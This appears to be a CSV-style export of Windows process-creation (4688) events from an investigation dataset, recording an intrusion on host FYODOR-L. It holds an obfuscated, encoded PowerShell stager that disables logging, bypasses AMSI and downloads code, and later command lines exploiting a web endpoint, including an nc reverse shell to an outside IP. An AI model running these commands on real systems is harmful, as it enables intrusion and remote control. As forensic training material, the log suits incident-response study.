	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAGwAeQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAVABWAGEATABVAGUAKAAkAE4AVQBsAGwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAE8AbABMAGUAQwBUAGkAbwBuAHMALgBHAGUATgBlAFIAaQBjAC4ARABpAEMAdABpAE8AbgBBAFIAWQBbAFMAdABSAEkATgBnACwAUwB5AFMAVABFAE0ALgBPAEIASgBFAGMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AEEATAB9AEUAbABzAGUAewBbAFMAYwByAEkAcAB0AEIAbABPAEMASwBdAC4AIgBHAGUAdABGAGkAZQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBFACgAJABOAFUAbABMACwAKABOAGUAdwAtAE8AQgBqAGUAYwBUACAAQwBPAEwATABFAGMAVABJAE8AbgBzAC4ARwBFAG4AZQBSAEkAYwAuAEgAYQBTAEgAUwBlAHQAWwBTAFQAcgBpAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIARQBmAF0ALgBBAHMAcwBFAG0AQgBMAHkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcAZQBUAEYASQBlAGwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAFUATABsACwAJAB0AFIAdQBlACkAOwB9ADsAWwBTAHkAUwBUAEUAbQAuAE4ARQBUAC4AUwBFAHIAVgBJAEMARQBQAG8ASQBuAFQATQBBAE4AYQBnAGUAUgBdADoAOgBFAHgAUABFAGMAVAAxADAAMABDAG8ATgB0AGkAbgB1AEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AYgBqAEUAQwB0ACAAUwB5AFMAdABFAE0ALgBOAGUAVAAuAFcARQBCAEMATABJAGUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAQwAuAEgARQBhAEQARQByAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAEQAZQBSAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAUgBvAHgAWQA9AFsAUwB5AHMAdABFAE0ALgBOAGUAdAAuAFcAZQBiAFIARQBxAFUAZQBTAHQAXQA6ADoARABFAGYAYQBVAGwAdABXAGUAQgBQAHIATwBYAHkAOwAkAFcAYwAuAFAAcgBPAFgAWQAuAEMAUgBFAEQAZQBuAFQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBFAFQALgBDAHIARQBEAEUAbgB0AGkAYQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQBUAFcATwBSAGsAQwByAEUARABFAE4AVABpAEEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBuAEMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeABUAC4ARQBuAEMATwBkAEkAbgBnAF0AOgA6AFUAbgBpAEMAbwBkAGUALgBHAEUAdABTAHQAUgBJAG4ARwAoAFsAQwBPAG4AVgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBTAGUANgA0AFMAVABSAEkAbgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBEAGUAUgBTAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBiAEsAUQB4AHAAdQBPAGQANQBMAFAAQwBqAHkAZgBSAEMAMQBCAHgAUABxAFEAOABGAFcASQA9ACIAKQA7ACQAZABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBMAG8AYQBkAEQAQQB0AEEAKAAkAHMAZQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABhAHQAQQBbADAALgAuADMAXQA7ACQAZABBAHQAQQA9ACQARABhAHQAQQBbADQALgAuACQARABhAFQAQQAuAEwARQBuAEcAdABoAF0AOwAtAEoAbwBpAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:13:56.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf2c
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:12:51.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x15ec
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""mknod /tmp/backpipe p""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:11:45.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x43c
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""md5sum /tmp/colonel.c""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:11:27.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1d94
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""cat /tmp/colonel.c""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:10:55.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c10
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""base64 --decode /tmp/colonel > /tmp/colonel.c""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:10:13.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1b74
	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""ls -lf /tmp""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T12:09:48.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
